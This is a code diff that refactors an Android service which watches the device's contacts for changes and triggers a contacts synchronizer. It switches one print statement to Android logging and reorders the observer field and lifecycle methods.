@@ -7,6 +7,7 @@ import android.net.Uri;
 import android.os.Handler;
 import android.os.IBinder;
 import android.provider.ContactsContract;
+import android.util.Log;
 
 import com.theah64.xrob.asynctasks.ContactsSynchronizer;
 import com.theah64.xrob.utils.APIRequestGateway;
@@ -14,7 +15,9 @@ import com.theah64.xrob.utils.APIRequestGateway;
 public class ContactsWatcherService extends Service {
 
     private static final int MIN_THRESHOLD = 5000;
+    private static final String X = ContactsWatcherService.class.getSimpleName();
     private static long lastTimeOfUpdate = 0;
+    private MyContactObserver contactObserver = new MyContactObserver(null);
 
     public ContactsWatcherService() {
 
@@ -25,13 +28,24 @@ public class ContactsWatcherService extends Service {
         return START_STICKY;
     }
 
-    private MyContactObserver contactObserver = new MyContactObserver(null);
-
     @Override
     public void onCreate() {
         super.onCreate();
-        System.out.println("Contact observer registered");
+        Log.d(X, "Contact observer registered");
         getContentResolver().registerContentObserver(ContactsContract.Contacts.CONTENT_URI, true, contactObserver);
+    }
+
+    @Override
+    public void onDestroy() {
+        getContentResolver().unregisterContentObserver(contactObserver);
+        System.out.println("Contact observer unregistered");
+        super.onDestroy();
+    }
+
+    @Override
+    public IBinder onBind(Intent intent) {
+        // TODO: Return the communication channel to the service.
+        throw new UnsupportedOperationException("Not yet implemented");
     }
 
     public class MyContactObserver extends ContentObserver {
@@ -71,18 +85,5 @@ public class ContactsWatcherService extends Service {
 
         }
 
-    }
-
-    @Override
-    public void onDestroy() {
-        getContentResolver().unregisterContentObserver(contactObserver);
-        System.out.println("Contact observer unregistered");
-        super.onDestroy();
-    }
-
-    @Override
-    public IBinder onBind(Intent intent) {
-        // TODO: Return the communication channel to the service.
-        throw new UnsupportedOperationException("Not yet implemented");
     }
 }
